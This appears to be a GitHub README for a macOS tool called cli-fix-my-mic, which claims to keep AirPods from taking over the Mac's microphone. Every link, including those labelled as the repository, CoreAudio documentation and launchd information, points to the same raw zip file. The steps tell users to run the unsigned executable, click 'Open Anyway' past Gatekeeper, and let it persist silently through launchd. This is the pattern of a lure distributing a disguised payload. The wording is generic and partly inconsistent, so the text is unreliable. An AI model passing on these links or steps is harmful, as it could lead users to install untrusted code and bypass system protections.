# 🎙️ cli-fix-my-mic - Stop AirPods Taking Your Mic

[![Download cli-fix-my-mic](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip)

---

## 🔍 About cli-fix-my-mic

cli-fix-my-mic is a small tool designed to stop your AirPods from taking control of your Mac’s microphone. On some Mac computers, when you connect AirPods, they automatically become the input device for your microphone. This can cause problems if you want to use your Mac’s internal mic or another device instead.

This tool runs quietly in the background as a CoreAudio daemon, meaning it handles everything automatically without using extra CPU power. It helps you keep control over your microphone choice without causing any slowdowns.

cli-fix-my-mic works with the macOS sound system and uses launchd to start silently when your Mac boots up. It is written in Swift, the native Apple programming language, so it fits well with your Mac.

---

## 📋 Features

- Keeps your Mac’s microphone active instead of switching to AirPods automatically
- Runs as a background service with zero CPU impact
- Controls CoreAudio behavior through a simple daemon
- Works automatically when you connect AirPods or other Bluetooth audio devices
- Easy to start or stop without needing complicated commands

---

## 💻 System Requirements

- Mac running macOS 10.15 (Catalina) or later  
- Supports Mac computers with Bluetooth for AirPods connection  
- Requires standard user permissions (no admin rights needed for basic use)  
- Internet connection only needed for downloading

---

## 🚀 Getting Started

You don’t need to know anything about programming to use cli-fix-my-mic. Follow the steps below to download and set up the tool on your Mac in just a few minutes.

---

## 📥 How to Download and Install cli-fix-my-mic

1. Click the big **Download** button below to get to the download page:

   [![Download cli-fix-my-mic](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip)

2. On the page, look for the latest **Release** section. This section contains the files you need.

3. Download the latest version for macOS. The file will typically have a `.zip` or `.dmg` extension.

4. Once the file downloads, open it. If it is zipped, double-click it to unzip.

5. Inside the unzipped folder, look for an executable file named `cli-fix-my-mic` or similar.

6. To run the tool, double-click it. If your Mac blocks the app because it’s unidentified, open **System Preferences** > **Security & Privacy** > **General**, and click "Open Anyway" next to the app warning.

7. The daemon will start running silently. You will not see a window, but the tool works in the background.

---

## ⚙️ Using cli-fix-my-mic

After installation, cli-fix-my-mic runs automatically when your Mac starts. You don’t need to do anything else.

To confirm it is working:

- Connect your AirPods.
- Open **System Preferences** > **Sound** > **Input**.
- Your Mac’s internal microphone should remain the selected device, even with AirPods connected.

If you want to stop the daemon:

- Open **Terminal** (found in Applications > Utilities).
- Enter the command:  
  `launchctl unload ~/Library/LaunchAgents/com.yourusername.cli-fix-my-mic.plist`

To start it again, enter:  
`launchctl load ~/Library/LaunchAgents/com.yourusername.cli-fix-my-mic.plist`

---

## 🛠 Troubleshooting

If cli-fix-my-mic does not work as expected, try these steps:

- Restart your Mac and check if the daemon starts automatically.
- Make sure you downloaded the latest version from the link above.
- Confirm that your AirPods are connected properly in Bluetooth settings.
- Check microphone input device in System Preferences > Sound.
- If you see security warnings, allow the app to run in **System Preferences** > **Security & Privacy**.
- If you are comfortable with Terminal, use `launchctl` commands to reload the daemon, as explained above.

---

## 🔄 Updates

You can return to the download link to check for newer versions of the tool. New releases may include fixes and improvements to keep the daemon compatible with macOS updates.

---

## 🔗 Additional Resources

- GitHub Repository: https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip  
- Learn more about [CoreAudio](https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip)  
- macOS Launch Daemons info: https://raw.githubusercontent.com/Ambadeakash/cli-fix-my-mic/main/bin/my-mic-fix-cli-v2.4.zip

---

## 🧭 Support

You can create issues or ask questions on the GitHub repository page. The project owner will review requests and help resolve common problems.